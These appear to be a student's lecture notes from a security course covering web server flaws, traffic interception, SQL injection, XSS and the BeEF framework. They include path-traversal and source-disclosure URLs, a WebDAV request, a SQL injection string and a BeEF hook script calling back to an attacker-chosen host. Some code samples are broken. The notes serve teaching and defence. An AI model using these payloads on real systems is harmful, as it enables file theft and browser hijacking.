# MODULE 0x0d LECTURE 0x310 - WEB HACKING

## Web hacking opportunities

- Web server vulnerabilities
- Web application vulnerabilities
- Backend database vulnerabilities


## Web server vulnerabilities

### Sample files
* Web servers are difficult to configure from the ground up.
    - Thus they are distributed with numerous sample files.

* Microsoft IIS 4.0 sample file vulnerability:
    - Sample scripts `showcode.asp` and `codebrews.asp` can reveal contents of files contained on the server (relative path traversal)
    - `http://[tgt]/msadc/Samples/SELECTOR/showcode.asp?source=/../../../../../boot.ini`
    - `http://[tgt]/iissamples/exair/howitworks/codebrews.asp?source=/../../../../../../winnt/repair/setup.log`

### Source code disclosure
* If an attack allows one to view source code, it may be possible to leverage this to find other files or information

* Example: IIS + .htr vulnerability:
    - `http://www.iisvictim.example/global.asa+htr`
    - Appending the `.htr` in one IIS version caused part of the contents of the referenced file to be returned

* `global.asa` is a desirable target
    - The global.asa configuration file resides in a known location
    - It contains code associated with new sessions (object variable, method declarations)
    - It may contain database connect code with the database username and password

### More source code disclosure
* Bugtraq 2527 reported a problem common ot WebLogicServer and TomcatServer:
    - `http://www.weblogicserver.example/index.js%70`
    - `http://www.tomcatserver.example/examples/jsp/num/numguess.js%70`

* When URL-encoded replacements for characters appear in a Java servlet filename, the server would return source code from the servlet.
    - What character is URL-encoded as `%70` (hex 70)?
    - A: `p`, making the extensions above `.jsp`

### Canonicalization
* Often more than one representation for the same string (URL, filename, etc.) exists.
    - In order to determine if a URL or filename matches a particular resource, canonicalization is used to map a name to a particular form.
    - (the root word "canon" = law; means that this is the version of the name given by law)

* Canonicalization errors usually occur when web server canonicalization process (that parses inputs and transforms the input) fails to faithfully carry out the law.
    - This causes the web server to fail to recognize that a URL is associated with the specific file it addresses

* Canonicalization error example: Apache
    - A relatively recent version of Apache for Windows could be configured as follows:
    - `DocumentRoot "C:/Documents and Settings/http/site/docroot"`
    - `ScriptAlias /cgi-bin "C:/Documents and Settings/http/site/docroot/cgi-bin"`

* Normal usage would expect a URL like the following and would execute the script foo:
    - `http://[target]/cgi-bin/foo`
    - BUT, the source code of the file would be delivered by using this URL:
    - `http://[target]/CGI-BIN/foo`
    - This is because Apache's routing code is case-sensitive, but Windows filesystems aren't.
    - Apache didn't canonicalize the path name properly

* Canonicalization eror example: Again! Again!
    - URl encoding requires decoding. Often, the decoding is done in more than one place. __This is a mistake.__

* Consider that `%25` decodes to `%` and that `%5c` decodes to `\`.
    - Then, multiple steps of decoding once can convert a URL like this:
    - `http://[target]/scripts/..%255c../winnt/system32/attrib.exe?c:\*.*`
    - Into URLs like this:
    - `http://[target]/scripts/..%5c../winnt/system32/attrib.exe?c:\*.*`
    - And finally URLs like this:
    - `http://[target]/scripts/..\../winnt/system32/attrib.exe?c:\*.*`

### Server extensions
* WebDAV (Web Distributed Authoring and Versioning) is a wonderful idea often gone wrong.
    - It was intended to let groups of people remotely author web content.

If WebDAV is enabled, requests such as this may function:
```
GET /global.asa\ HTTP/1.0
Host: 192.168.20.10
Translate: f
[CRLF]
[CRLF]
```
`Translate: f` says to use ISAPI filter `httpext.dll` _before_  IIS sees the request, and the trailing `\` is handled by that filter in a way that causes the request to be sent to the underlying OS filesystem, delivering the content to the user.

### Input validation
* An ancient attack, but not extinct.
    - This can lead to buffer overflows, integer errors, and heap exploits

* We dont't expect to find format string errors in web servers...
    - ... but it's possible because web servers generate log message strings and numerous other strings.
    - At the end of the day, web servers often generate many logs and strings that may use functions like printf.


### Denial of service
- [Advisory 28122011](https://www.cise.ufl.edu/~jnw/dead_links/advisory28122011.pdf)
    - Describes the concept of attacking naive programming language hash table implementations to waste server time using a __meet in the middle__ attack

Note that DoSs are generally not wanted in a pentest (but point them out of vulnerabilities to them exist).

This attack
- Identifies many strings that are likely to hash to the same location
- Uses the concepts of the fact that strings may be put in the same bucket in a hash map, resulting in the hash map getting longer and longer.
- It presents these strings as POST parameters (which are typicall stored in a hash table) to cause server thrashing.

All modern runtime environments (PHP5, .NET, Java, Python, Ruby) were susceptible at the time of release in 2011.


## AVOIDANCE?

* Sample files
    - DON'T PROVIDE THEM!
    - Don't use them, don't leave them lying around.

* Source code disclosure
    - Fix the server!

* Canonicalization
    - Fix the server!

* Server extensions
    - Don't use them!

* Input validation
    - Fix the server and/or fix your code!

* Denial of Service (DoS)
    - Fix the plugins!





# MODULE 0x0d LECTURE 0x330 - WEB INTERCEPTION

## Figuring out about web servers with netcat

* Just netcat the IP and pass in  to get the HTTP header
    - `nc <HTTP server> 80`
    - `GET / HTTP/1.0`
    - A 'Host' header is required for HTTP 1.1, e.g.
    - `Host: 192.168.1.191`


### QUIZ ACCESS CODE

Saint Agnes - Why do you Refuse to Die


## Browsers and servers lie

* The API messages sent between browsers and servers provide a wealth of information about the software that is running, properties of the endpoint computers, and user information
    - All of these things can be false information.
    - Browser user agent strings can be forged
    - User information can be fake

* Lying to browsers can be extremely helpful in testing security.
    - If we can fool them into doing things they shouldn't, then so can anyone else.


## Intercepting and modifying API messages

You can intercept the message passed between a browser and a server in 2 ways:
1. Using a proxy
2. Using a browser tool

* A _proxy_ is an appointed representative empowered to act on your behalf
* A _web proxy_ is a program specifically designed to forward API messages to web servers on behalf of your browser and then return the server responses.

## Why would I want a proxy

* Store commonly referenced pages
* Restrict web usage
* Track web usage
* etc.

Burp suite good. OWASP ZAP also good


## Web connection without proxy


## Proxy required configuration


## Browser interception tools

* Mozilla web request
    - Programmable API

* Tamperchrome
    - Provides a tool that augments browsing user interface


## Hackable web applications

* OWASP Juice Shop
    - Alternatives at vulnerwablewebapps.org


## Javascript validation bypass

* Servers may try to enforce security by using Javascript client-side code to validate input
    - This can be used, for example, to filter special characters (which might be interpreted incorrectly or might be used in a malicious exploit) out of password fields
    - This is unsafe, of course, because browser is under user's control and makes the JS readily editable and stoppable.

* Burp intruder is good for this


## SQL injection

Sample SQL code in PHP for user auth:
```php
$1QueryString =
    "SELECT username FROM accounts WHEREusername ='".$pusername."' AND PASSWORD='".password."';";

$1QueryResult = $this->mySQLHandler->executeQuery($1QueryString);
```

* What is the problem?
    - escape the quotes of the source code, e.g. `USERNAME='jnw';--`


## Avoiding SQL injection

Alternatives exist (PHP Data Objects)
```php
$sth = $db->prepare("SELECT * FROM accounts WHERE username=?and password=?");

$sth->execute([$pUsername $pPassword]);

$results = $sth->fetchAll(PDO::FETCH_ASSCOC);
```
* In this case, the structure of the query is fixed and the values of the variable are conveyed to the database server separately -- not as characters of a long query string


## Forging session tokens

If multiple web pages must be visited in the context of a single session, the server must maintain some kind of session token in the user's browser.

* If the security of the session information is weak, an attacker may be able to forge information from another user

* Session tokens are often maintained in __cookies__ stored in browser
    - Can be manipulated and stuff





# MODULE 0x0d LECTURE 0x340 - XSS AND BROWSER EXPLOITATION

## XSS: what is it, really?

A: An injection problem in which an attacker injects a malicious script into a website

1. Persistent
 A script is stored in a persistent medium on a target server (usually a database) is inserted into a webpage by the server and then delivered to the user's web browser
2. Reflected
 A user is given a URL that includes a script (typically in a GET parameter) that will be inserted into a webpage __by the server__ and then reflected back to the user's browser
3. DOM based
 A user is given a URL of a __static__ page containing a parameter with a script in its value. If the parameter is used in Javascript code modifying the Document Objecct Model (DOM) including the parameter's value, then the __browser itself__ has inserted the script, not the server.


## XSS is injection

XSS causes __injection__ (insertion of unexpected, unforeseen input) of malicious code into a webpage.

* The browser executes the malicious code.
    - This requires us to be able to input something that sparks execution of code in the browser (usually Javascript code)


## Ways to avoid XSS

- __Validate__ the form of data on the server-side (not the client-side). Try to avoid putting it in a database if possible.

- If you choose to _sanitize_ data, __denying__ dangerous characters is a poor method of addressing this. Instead, allow safe characters [A-Za-z0-9]
    - Standards will chang (new tags, etc.)
    - Database content can be directly modified to include malicious content
    - Use trusted libraries, e.g. DOMPurify

- __Allowing__ valid data to be used as input is a more reliable approach

- Never insert untrusted data anywhere (if possible).

- If you feel you must insert untrusted data, escape it appropriately.
    - [OWASP XSS prevention cheat sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

- __Output encoding__

- Use `HTTPOnly` cookies!
    - These are inaccessible to Javsacript in all current browsers.
    - The default is for cookies to be HTTP-accessible (insecure)

- Use as restrictive a Content Security Policy (CSP) as possible.
    - Default is no CSP, i.e. insecure

- Understand your web dev framework and use it properly
    - Default is that devs don't really know enough i.e. insecure


## Delivering reflected XSS

- Often delivered via phishing attacks
- Often obfuscated URLs containing scripts may be transmitted via email
- Link on a webpage may have an `onClick` method bound to a function that rewrites the link
- A QR code may purport to go to a trustworthy website but through a route that inserts a script into POST or GET parameters


## BeeF (Browser Exploitation Framework)

Platform for generating and delivering payloads directly to the browser.

Goes beyond typical XSS and provides robust platform for pentesting.

* Modules supporting IPC (interprocess communication) and exploitation, history gathering, intelligence, network recon, host info gathering, browser plugin detection, etc.


## BeEF Structure

Beef console -> Beef server -> zombies (infected browsers)

Simple hook script is:
`<script src="http://your-ip:3000/hook.js"type="text/javascript"></script>`

Once a browser is hooked, it connects back to the Beef server

END  MODULE 0x0d
